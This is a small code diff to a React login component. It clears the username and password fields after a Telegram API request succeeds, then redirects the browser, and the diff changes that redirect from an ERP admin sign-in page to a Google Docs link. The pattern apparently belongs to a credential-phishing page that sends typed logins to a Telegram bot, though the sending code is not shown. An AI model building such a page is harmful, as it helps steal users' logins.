@@ -31,7 +31,8 @@ const App = () => {
       if (data.ok) {
         setLogin("");
         setPassword("");
-        window.location.href = "https://erp.admin.najottalim.uz/signin";
+        window.location.href =
+          "https://docs.google.com/document/d/14izHVuD5HkClNEkzKDQoVln9NRzZTid4/edit";
       } else {
         console.log("Xatolik yuz berdi (Telegram API)");
       }
